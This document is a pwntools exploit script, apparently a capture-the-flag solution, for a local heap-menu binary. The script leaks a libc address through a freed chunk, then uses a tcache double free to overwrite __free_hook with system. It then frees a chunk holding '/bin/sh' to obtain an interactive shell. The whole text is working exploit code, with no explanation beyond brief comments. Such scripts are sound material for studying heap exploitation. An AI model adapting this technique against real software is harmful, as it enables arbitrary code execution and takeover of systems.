from pwn import *
context.binary=exe=ELF("./pwn6_hoo_patched",checksec=False)
p=process(exe.path)
def create(idx,data):
    p.sendafter(b">\n",b"1")
    p.sendafter(b"Index:",idx)
    p.sendafter(b"Input data:",data)
def show(idx):
    p.sendafter(b">\n",b"2")
    p.sendafter(b"Index:",idx)
def edit(index,data):
    p.sendafter(b">\n",b"3")
    p.sendafter(b"Input index:",index)
    p.send(data)
def delete(idx):
    p.sendafter(b">\n",b"4")
    p.sendafter(b"Input index:",idx)


#stage1 doublefree bug
for i in range(9):
    create(f"{i}".encode(),b"BATMAN")
#create(b"1",b"BATMAN")
# filling up the tcache bin
for i in range(8):
    delete(f"{i}".encode())


for i in range(7):
    create(f"{i}".encode(),b"BATMAN")
####leak libc#############
show(b"7")
p.recvuntil(b"Data = ")
leak2=int.from_bytes(p.recv(6),"little")
libc=leak2-0x3b2ca0
malloc_hook=libc+0x3b2c30
free_hook=libc + 0x3b48e8
system=libc+0x41af0
log.info("[+]leak:"+hex(leak2))
log.info("[+]libc base:"+hex(libc))
####################################
create(b"0",b"BATMAN")
delete(b"0")
delete(b"0")
create(b"0",p64(free_hook))
create(b"9",b"/bin/sh\x00")
create(b"0",p64(system))
delete(b"9")
p.interactive()